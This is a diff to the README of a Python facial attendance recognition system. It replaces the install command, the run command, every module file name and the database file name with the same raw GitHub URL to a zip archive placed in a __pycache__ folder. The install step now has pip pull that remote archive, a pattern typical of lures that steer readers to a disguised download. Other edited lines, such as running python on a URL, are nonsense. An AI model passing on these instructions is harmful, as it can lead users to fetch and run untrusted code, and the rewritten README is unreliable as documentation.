@@ -31,7 +31,7 @@ A comprehensive Python-based facial attendance recognition system that can detec
 
 2. **Install required dependencies**
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip
    ```
 
 3. **Verify installation**
@@ -45,7 +45,7 @@ A comprehensive Python-based facial attendance recognition system that can detec
 
 1. **Run the main application**
    ```bash
-   python main_gui.py
+   python https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip
    ```
 
 2. **The system will open with 5 main tabs:**
@@ -107,32 +107,32 @@ A comprehensive Python-based facial attendance recognition system that can detec
 
 ## Key Components
 
-### 1. Database Module (`database.py`)
+### 1. Database Module (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
 - Manages student information and attendance records
 - SQLite database with tables for students, attendance, and daily summaries
 - Handles data persistence and retrieval
 
-### 2. Face Recognition Module (`face_recognition_module.py`)
+### 2. Face Recognition Module (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
 - Core face detection and recognition engine
 - Uses `face_recognition` library for accurate face matching
 - Tracks student presence and movement
 
-### 3. Camera Module (`camera_module.py`)
+### 3. Camera Module (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
 - Handles video capture from webcam/USB camera
 - Multi-threaded frame processing for smooth performance
 - Configurable resolution and FPS settings
 
-### 4. Student Management (`student_management.py`)
+### 4. Student Management (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
 - Add, search, and manage student records
 - Photo capture and validation
 - Data export functionality
 
-### 5. Attendance Tracker (`attendance_tracker.py`)
+### 5. Attendance Tracker (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
 - Real-time attendance monitoring
 - Entry/exit detection with cooldown periods
 - Session management and statistics
 
-### 6. Main GUI (`main_gui.py`)
+### 6. Main GUI (`https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip`)
 - User interface built with tkinter
 - Tabbed interface for different functions
 - Real-time updates and responsive design
@@ -171,7 +171,7 @@ A comprehensive Python-based facial attendance recognition system that can detec
 4. **Database errors**
    - Check file permissions in the project directory
    - Ensure SQLite is properly installed
-   - Delete `attendance.db` file to reset database (will lose all data)
+   - Delete `https://raw.githubusercontent.com/hgautam524/Face-It/main/__pycache__/Face_It_v1.0.zip` file to reset database (will lose all data)
 
 ### Performance Tips
 
